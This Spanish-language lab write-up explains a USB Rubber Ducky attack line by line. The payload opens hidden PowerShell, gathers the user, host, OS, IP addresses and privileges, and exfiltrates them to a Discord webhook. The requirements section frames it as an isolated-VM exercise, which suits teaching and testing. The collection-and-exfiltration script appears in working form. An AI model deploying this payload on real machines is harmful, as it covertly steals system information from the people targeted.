# Explicación línea a línea

## 🔹 DuckyScript

| Línea | Función |
|-------|---------|
| `DUCKY_LANG es` | Distribución de teclado española |
| `DELAY 1000` | Espera a que Windows cargue el driver HID |
| `GUI r` | Abre el diálogo **Ejecutar** (Win+R) |
| `DELAY 500` | Espera a que aparezca el diálogo |
| `STRING powershell` + `ENTER` | Abre una ventana de PowerShell (visibilidad reducida) |
| `DELAY 1200` | Espera a que PowerShell cargue |
| `STRING powershell -WindowStyle Hidden -EncodedCommand ...` + `ENTER` | Lanza el payload **oculto** |
| `ENTER` | Ejecuta el comando |

### Flags de PowerShell

- `-WindowStyle Hidden`: ventana invisible al usuario.
- `-EncodedCommand`: recibe el comando en Base64 UTF-16LE.
- (Común añadir `-ep bypass`, pero **no aparece** en tu payload).

## 🔹 Script PowerShell (decodificado)

### Recolección

```powershell
$u  = whoami
$h  = hostname
$so = (Get-CimInstance Win32_OperatingSystem).Caption
$ip = ((Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object InterfaceAlias -notlike '*Loopback*').IPAddress -join ', ')
$p  = (whoami /priv | Out-String).Trim()
```

### Formateo del mensaje
```powershell
$msg = "AUDITORIA`nUsuario: $u`nHost: $h`nSO: $so`nIP: $ip`nPrivilegios:`n$p"
```
`n → salto de línea.

Se construye un texto multilínea con toda la info.

### JSON para Discord
```powershell
$json = ConvertTo-Json @{content=$msg} -Compress
$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
```
Discord espera {"content": "..."}. El uso de $bytes en UTF-8 evita
problemas con tildes y caracteres especiales.

### Exfiltración
```powershell
Invoke-RestMethod -Uri "Discord_Webhook_URL" `
    -Method Post `
    -Body $bytes `
    -ContentType "application/json; charset=utf-8"
POST al webhook → el atacante recibe el mensaje en su canal.
```
---

# 🧠 Flujo completo del ataque
        USB conectado → Windows lo reconoce como teclado.
        Ducky escribe Win+R y lanza PowerShell.
        PowerShell ejecuta el comando Base64 oculto.
        El script recolecta info del sistema.
        Envía el JSON al webhook de Discord.
        El atacante ve el mensaje en su canal privado.


---

## 📄 `docs/requisitos.md`

```markdown
# Requisitos

## Hardware
- USB Rubber Ducky / Flipper Zero / Pico Ducky / cualquier HID programable.

## Software
- Windows 10/11 en **VM aislada** (VirtualBox, VMware, Hyper-V).
- CyberChef: https://gchq.github.io/CyberChef/
- Servidor Discord con webhook **de laboratorio**.

## Preparación
1. Crea una VM Windows con **snapshot previo**.
2. Configura red **host-only** o sin salida a Internet salvo para el webhook.
3. Genera un webhook **exclusivo del lab**.
4. Nunca uses webhooks personales ni de terceros.
5. Documenta el uso y destruye la VM al terminar.
```
